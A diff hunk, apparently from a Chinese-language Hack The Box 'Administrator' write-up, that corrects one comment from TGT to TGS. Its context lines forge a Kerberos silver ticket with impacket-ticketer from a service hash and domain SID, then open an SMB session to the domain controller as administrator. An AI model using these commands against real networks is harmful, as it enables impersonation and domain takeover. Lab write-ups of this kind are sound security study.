@@ -121,7 +121,7 @@ smbclient.py -k -no-pass administrator.htb@dc.administrator.htb
 ```
 #生成TGS证书
 impacket-ticketer -nthash <SERVICE_COMPUTER_HASH> -domain-sid <SID> -domain administrator.htb -spn cifs/dc.administrator.htb administrator
-#使用TGT证书
+#使用TGS证书
 export KRB5CCNAME=administrator.ccache
 klist
 smbclient.py -k -no-pass administrator.htb@dc.administrator.htb
